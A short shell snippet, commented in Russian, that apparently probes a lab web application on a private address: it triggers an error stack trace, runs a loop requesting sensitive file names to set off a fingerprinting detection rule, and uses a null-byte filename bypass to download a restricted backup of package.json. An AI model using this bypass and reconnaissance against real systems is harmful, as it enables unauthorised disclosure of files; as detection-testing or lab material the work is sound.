# stack trace с версиями компонентов
curl "http://172.20.0.106:3000/ftp/nonexistent.txt"

# серия 403 — fingerprinting scan (правило 4506002)
for f in config.exe library.dll admin.jsp backup.txt secrets.txt; do
    curl -s -o /dev/null "http://172.20.0.106:3000/ftp/$f"
done

# зависимости из package.json
curl -s "http://172.20.0.106:3000/ftp/package.json.bak%2500.md" -o package.json.bak
jq '.version, .dependencies' package.json.bak
